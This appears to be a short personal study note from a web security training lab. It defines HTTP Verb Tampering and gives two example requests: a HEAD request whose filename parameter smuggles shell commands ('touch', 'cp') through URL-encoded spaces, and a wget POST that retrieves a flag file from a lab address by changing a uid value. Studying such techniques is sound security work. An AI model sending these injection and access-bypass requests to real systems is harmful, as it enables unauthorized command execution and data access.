Related articles:
Tags: #Maneuvers 

---
# 📖 Definition: 
HTTP Verb Tampering is the action of bypassing security controls through sending a different request than the one that the web app expects.
This can happen due to misconfigurations (which will usually be found by scanners) or it can happen due to insecure code (which will not usually be found by scanners).

Whenever we work with the Headers, remember that URL Encoding is a must. 
![[Pasted image 20250208124543.png]]
HEAD /index.php?filename=file5%20touch%20test2%20cp%20%20test67 HTTP/1.1

wget --post-data "uid=15" \
     -O flag.txt \
     "http://94.237.54.116:43358/documents/flag_11dfa168ac8eb2958e38425728623c98.txt"
